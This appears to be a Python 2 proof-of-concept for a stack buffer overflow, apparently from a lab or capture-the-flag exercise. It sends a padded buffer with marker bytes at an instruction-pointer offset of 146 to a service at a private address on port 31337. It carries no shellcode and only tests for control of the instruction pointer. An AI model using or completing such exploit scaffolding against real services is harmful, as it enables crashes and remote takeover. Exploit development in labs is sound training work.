#!/usr/bin/python
import socket
import time

ip = "172.16.32.128"
port = 31337


eip_off = 146
buf_supp = 1024


buf = ''
buf += "A" * (eip_off - len(buf))
buf += "B" * 4
buf += "C" * 4
buf += "D" * (buf_supp - len(buf))


try:
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
   connect = s.connect((ip, port))
   time.sleep(1)
   s.send(buf + "\n");
   s.close()

except Exception as e:
   print(e)
